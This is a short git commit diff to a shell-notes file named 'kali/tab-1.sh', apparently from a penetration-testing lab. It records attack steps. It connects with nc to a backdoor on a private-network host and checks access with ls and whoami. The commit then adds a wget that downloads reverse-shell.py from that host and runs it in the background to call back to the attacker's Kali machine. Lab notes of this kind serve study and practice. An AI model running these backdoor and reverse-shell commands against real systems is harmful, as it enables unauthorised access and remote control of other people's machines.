e638c56db3e565a4dc1d933cf401f7c807f7decc
hellcard <wseven347.devopser@gmail.com>
2025-01-10 00:35:06 -0700

    Update tab-1.sh

--- kali/tab-1.sh
+++ kali/tab-1.sh
@@ -1,8 +1,12 @@
 # this is the tab where the backdoor is running
 nc 192.168.1.101 6200
 
+# ---
 # commands for work check
 ls
 whoami
+# ---
 
 
+wget 192.168.1.101:8080/reverse-shell.py
+python reverse-shell.py 192.168.1.100 & # 192.168.1.100 - ip kali / server ip
